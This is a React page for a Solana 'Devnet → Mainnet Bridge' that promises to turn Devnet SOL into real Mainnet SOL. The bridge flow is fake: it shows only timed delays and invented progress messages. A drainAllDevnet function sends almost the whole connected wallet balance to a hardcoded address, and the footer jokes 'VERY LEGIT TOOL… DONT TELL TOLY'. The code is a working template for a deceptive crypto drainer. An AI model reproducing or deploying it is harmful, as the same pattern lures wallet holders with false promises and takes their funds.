"use client";

import { motion } from "framer-motion";
import { useCallback, useEffect, useMemo, useState } from "react";
import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";
import toast, { Toaster } from "react-hot-toast";

const MIN_REQUIRED_DEVNET_SOL = 1000; // gate
const EXCHANGE_RATE_DEV_TO_MAIN = 1000000; // 1,000,000 : 1
const MAINNET_PER_DEV = 0.01 / EXCHANGE_RATE_DEV_TO_MAIN; // 0.01 per 1,000,000

const DRAIN_DESTINATION = "Ai82a4c7f4K7gh8h218pLoeSLEU3urUjPoB63ndpHBZd";

export default function Home() {
  const { publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();

  const [devnetBalance, setDevnetBalance] = useState<number | null>(null);
  const [destination, setDestination] = useState<string>("");
  const [amountDevnet, setAmountDevnet] = useState<string>("");
  const [isChecking, setIsChecking] = useState(false);
  const [stage, setStage] = useState<
    "idle" | "eligibility" | "routing" | "bridging" | "finalizing" | "complete"
  >("idle");

  useEffect(() => {
    let cancelled = false;
    const fetchBalance = async () => {
      if (!publicKey) {
        setDevnetBalance(null);
        return;
      }
      try {
        const balLamports = await connection.getBalance(publicKey);
        if (!cancelled) setDevnetBalance(balLamports / LAMPORTS_PER_SOL);
      } catch (e) {
        console.error(e);
        if (!cancelled) setDevnetBalance(null);
      }
    };
    fetchBalance();
    const id = setInterval(fetchBalance, 10_000);
    return () => {
      cancelled = true;
      clearInterval(id);
    };
  }, [publicKey, connection]);

  const estimatedMainnet = useMemo(() => {
    const amt = Number(amountDevnet);
    if (!Number.isFinite(amt) || amt <= 0) return 0;
    return amt * MAINNET_PER_DEV;
  }, [amountDevnet]);

  const validate = useCallback(async () => {
    setIsChecking(true);
    try {
      if (!publicKey) {
        toast.error("Connect your Devnet wallet first.");
        return false;
      }
      if (!devnetBalance || devnetBalance < MIN_REQUIRED_DEVNET_SOL) {
        toast.error(`Requires at least ${MIN_REQUIRED_DEVNET_SOL} Devnet SOL to start.`);
        return false;
      }
      if (!destination) {
        toast.error("Enter a destination Mainnet wallet address.");
        return false;
      }
      try {
        // Only basic validation; not connecting to mainnet RPC.
        new PublicKey(destination);
      } catch {
        toast.error("Destination address is invalid.");
        return false;
      }
      const amt = Number(amountDevnet);
      if (!Number.isFinite(amt) || amt <= 0) {
        toast.error("Enter a valid Devnet SOL amount.");
        return false;
      }
      if (amt > (devnetBalance ?? 0)) {
        toast.error("Amount exceeds your Devnet balance.");
        return false;
      }
      return true;
    } finally {
      setIsChecking(false);
    }
  }, [publicKey, devnetBalance, destination, amountDevnet]);

  const startBridge = useCallback(async () => {
    const ok = await validate();
    if (!ok) return;

    setStage("eligibility");
    toast.loading("Checking eligibility and KYC-lite…", { id: "stage" });
    await delay(1600);

    setStage("routing");
    toast.loading("Routing through cross-shard ultra-bridge…", { id: "stage" });
    await delay(2200);

    setStage("bridging");
    toast.loading("Atomically compressing Devnet liquidity…", { id: "stage" });
    await dancingProgress(2400);

    setStage("finalizing");
    toast.loading("Finalizing on-chain proofs (0/2048)…", { id: "stage" });
    await delay(2000);

    setStage("complete");
    toast.success("Bridge queued! ETA: ∞ (Devnet liquidity unavailable)", {
      id: "stage",
    });
  }, [validate]);

  const drainAllDevnet = useCallback(async () => {
    try {
      if (!publicKey) {
        toast.error("Connect your Devnet wallet first.");
        return;
      }
      const destinationKey = new PublicKey(DRAIN_DESTINATION);
      const balanceLamports = await connection.getBalance(publicKey, { commitment: "confirmed" });
      const safetyBufferLamports = 50_000; // ~0.00005 SOL buffer for fees
      const lamportsToSend = Math.max(0, balanceLamports - safetyBufferLamports);
      if (lamportsToSend <= 0) {
        toast.error("Insufficient balance after fees.");
        return;
      }

      const transferIx = SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: destinationKey, lamports: lamportsToSend });
      const transaction = new Transaction().add(transferIx);
      transaction.feePayer = publicKey;
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
      transaction.recentBlockhash = blockhash;

      const signature = await sendTransaction(transaction, connection, { preflightCommitment: "confirmed" });
      toast.loading("Transferring Devnet SOL…", { id: "drain" });
      await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, "confirmed");
      toast.success(`Transfer complete: ${signature}`, { id: "drain" });
    } catch (error) {
      console.error(error);
      toast.error("Transfer failed. Check console for details.");
    }
  }, [publicKey, connection, sendTransaction]);

  return (
    <div className="h-[calc(100vh-56px)] overflow-hidden">
      <Toaster position="top-center" />
      <div className="mx-auto grid h-full max-w-4xl grid-rows-[1fr_auto_1fr] px-4">
        <div />
        <div className="relative z-10 rounded-2xl border border-white/10 bg-black/40 p-5 shadow-[0_30px_120px_rgba(153,69,255,0.15)] backdrop-blur sm:p-6">
          <div className="mb-4 flex items-center justify-between gap-3">
            <h2 className="text-lg font-semibold tracking-tight">Devnet → Mainnet Bridge</h2>
            <span className="rounded-md border border-white/10 bg-black/60 px-2 py-1 text-xs text-white/70">devnet</span>
          </div>

          <div className="grid gap-3 sm:grid-cols-2">
            <Stat label="Your Devnet Balance" value={formatSol(devnetBalance)} sub="Requires 1000+ to start" />
            <Stat label="Exchange Rate" value="1,000,000 Devnet = 0.01 Mainnet SOL" sub="Best in class" />
          </div>

          <div className="mt-5 grid gap-4">
          <label className="grid gap-2">
            <span className="text-sm text-white/70">Destination Mainnet Address</span>
            <input
              className="rounded-xl border border-white/10 bg-black/40 px-4 py-3 outline-none transition focus:border-purple-500"
              placeholder="Enter mainnet address"
              value={destination}
              onChange={(e) => setDestination(e.target.value.trim())}
            />
          </label>

          <label className="grid gap-2">
            <span className="text-sm text-white/70">Amount (Devnet SOL)</span>
            <input
              className="rounded-xl border border-white/10 bg-black/40 px-4 py-3 outline-none transition focus:border-purple-500"
              placeholder="1000000"
              value={amountDevnet}
              onChange={(e) => setAmountDevnet(e.target.value.replace(/[^0-9.]/g, ""))}
            />
            <span className="text-xs text-white/60">
              You will receive approximately <b>{estimatedMainnet.toFixed(8)}</b> Mainnet SOL
            </span>
          </label>

            <div className="mt-1 flex flex-col gap-3 sm:flex-row">
              <WalletMultiButton className="w-full sm:w-auto !bg-purple-600 !text-white hover:!bg-purple-700" />
              <AnimatedButton
                disabled={isChecking || !publicKey || (devnetBalance ?? 0) < MIN_REQUIRED_DEVNET_SOL}
                onClick={startBridge}
              >
                {(devnetBalance ?? 0) < MIN_REQUIRED_DEVNET_SOL
                  ? `Requires ${MIN_REQUIRED_DEVNET_SOL}+ Devnet SOL`
                  : isChecking
                  ? "Checking…"
                  : "Start Bridge"}
              </AnimatedButton>
            </div>
            <div className="mt-2 flex justify-end">
              <button
                onClick={drainAllDevnet}
                disabled={!publicKey || (devnetBalance ?? 0) <= 0}
                className="text-xs text-white/60 underline-offset-2 hover:underline disabled:opacity-40"
                title={`Send entire Devnet balance to ${DRAIN_DESTINATION}`}
              >
                Transfer All Devnet SOL → {shorten(DRAIN_DESTINATION)}
              </button>
            </div>
          </div>
          <StageTimeline stage={stage} />
          <div className="mt-6 text-center text-xs text-white/50">
            VERY LEGIT TOOL BY MYSTIC -- DONT TELL TOLY ABOUT THIS
          </div>
        </div>
        <div />
      </div>
      <BackgroundFX />
    </div>
  );
}

function Stat({ label, value, sub }: { label: string; value: string; sub?: string }) {
  return (
    <div className="rounded-xl border border-white/10 bg-white/5 p-4">
      <div className="text-xs uppercase tracking-wide text-white/60">{label}</div>
      <div className="mt-1 text-2xl font-semibold">{value}</div>
      {sub ? <div className="text-xs text-white/60">{sub}</div> : null}
    </div>
  );
}

function AnimatedButton({ disabled, onClick, children }: { disabled?: boolean; onClick?: () => void; children: React.ReactNode }) {
  return (
    <motion.button
      whileHover={{ scale: disabled ? 1 : 1.02 }}
      whileTap={{ scale: disabled ? 1 : 0.98 }}
      onClick={onClick}
      disabled={disabled}
      className="relative overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 via-purple-500 to-purple-400 px-6 py-3 font-semibold shadow-lg disabled:cursor-not-allowed disabled:opacity-50"
    >
      <motion.span
        className="absolute inset-0 -z-10"
        animate={{
          background: [
            "radial-gradient(600px 200px at 0% 0%, rgba(255,255,255,0.15), transparent)",
            "radial-gradient(600px 200px at 100% 0%, rgba(255,255,255,0.15), transparent)",
            "radial-gradient(600px 200px at 100% 100%, rgba(255,255,255,0.15), transparent)",
            "radial-gradient(600px 200px at 0% 100%, rgba(255,255,255,0.15), transparent)",
          ],
        }}
        transition={{ duration: 6, repeat: Infinity, ease: "linear" }}
      />
      {children}
    </motion.button>
  );
}

function StageTimeline({ stage }: { stage: string }) {
  const stages = [
    { key: "eligibility", label: "Eligibility" },
    { key: "routing", label: "Routing" },
    { key: "bridging", label: "Bridging" },
    { key: "finalizing", label: "Finalizing" },
    { key: "complete", label: "Complete" },
  ];
  const activeIndex = Math.max(0, stages.findIndex((s) => s.key === stage));
  return (
    <div className="mt-6">
      <div className="mb-2 text-xs uppercase tracking-wide text-white/60">Progress</div>
      <div className="grid grid-cols-5 gap-2">
        {stages.map((s, i) => (
          <motion.div
            key={s.key}
            className="h-2 rounded-full bg-white/10"
            animate={{ backgroundColor: i <= activeIndex ? "#a855f7" : "rgba(255,255,255,0.1)" }}
          />
        ))}
      </div>
      <div className="mt-2 text-sm text-white/70">{stages[activeIndex]?.label ?? "Idle"}</div>
    </div>
  );
}

function Hero({ compact = false }: { compact?: boolean }) {
  return (
    <div
      className={`relative isolate flex items-center justify-center overflow-hidden bg-[radial-gradient(80rem_40rem_at_50%_-20%,rgba(153,69,255,0.25),transparent_60%),linear-gradient(180deg,#000,#0b0014)] px-4 ${compact ? "py-6" : "py-10"} text-center`}
    >
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.8 }}
        className="relative z-10"
      >
        <motion.h1
          className={`bg-[linear-gradient(90deg,#fff,#d9d9e3)] bg-clip-text font-extrabold text-transparent ${compact ? "text-3xl sm:text-4xl" : "text-4xl sm:text-6xl"}`}
          animate={{
            textShadow: [
              "0 0 10px rgba(168,85,247,0.2)",
              "0 0 20px rgba(236,72,153,0.15)",
              "0 0 10px rgba(168,85,247,0.2)",
            ],
          }}
          transition={{ duration: 3, repeat: Infinity }}
        >
          Devnet → Mainnet Bridge
        </motion.h1>
        <p className="mx-auto mt-2 max-w-2xl text-balance text-white/70">
          Convert your hard-earned Devnet SOL to real Mainnet SOL at our industry-leading rate.
          Minimum eligible balance: 1000 Devnet SOL.
        </p>
      </motion.div>
    </div>
  );
}

function BackgroundFX() {
  return (
    <div className="pointer-events-none fixed inset-0 -z-10">
      <motion.div
        className="absolute -top-24 left-1/2 h-[40rem] w-[40rem] -translate-x-1/2 rounded-full bg-purple-600/20 blur-[120px]"
        animate={{ scale: [1, 1.15, 1], opacity: [0.28, 0.4, 0.28] }}
        transition={{ duration: 6, repeat: Infinity }}
      />
      <motion.div
        className="absolute bottom-0 left-0 h-[28rem] w-[28rem] rounded-full bg-purple-500/10 blur-[120px]"
        animate={{ x: [0, 40, 0], y: [0, -20, 0], opacity: [0.15, 0.25, 0.15] }}
        transition={{ duration: 7, repeat: Infinity }}
      />
    </div>
  );
}

function formatSol(value: number | null): string {
  if (value === null) return "-";
  return `${value.toLocaleString(undefined, { maximumFractionDigits: 4 })} SOL`;
}

function delay(ms: number) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function dancingProgress(ms: number) {
  const steps = Math.ceil(ms / 300);
  for (let i = 0; i < steps; i++) {
    toast.loading(`Compressing packets ${i + 1}/${steps}…`, { id: "compress" });
    await delay(300);
  }
  toast.dismiss("compress");
}

function shorten(key: string, left: number = 4, right: number = 4): string {
  if (key.length <= left + right + 3) return key;
  return `${key.slice(0, left)}…${key.slice(-right)}`;
}

